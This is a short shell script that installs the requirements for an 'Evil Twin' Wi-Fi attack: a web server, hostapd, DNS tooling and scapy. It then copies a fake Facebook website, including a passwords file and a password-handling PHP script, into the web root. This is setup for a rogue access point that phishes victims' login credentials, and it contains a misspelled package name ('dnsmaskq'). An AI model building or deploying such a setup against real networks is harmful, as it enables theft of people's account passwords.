#!/bin/sh


echo Perform Evil Twin attack requirements
sudo apt-get update
sudo apt install apache2
sudo apt install hostapd
sudo apt install dnsmaskq
sudo pip install scapy
sudo pip install colorama
sudo cp -rf fake-facebook-website/* /var/www/html/
sudo chmod -x /var/www/html/passwords.txt
sudo chmod -x /var/www/html/password_handler.php
echo Please see that are all the requirements are succefully installed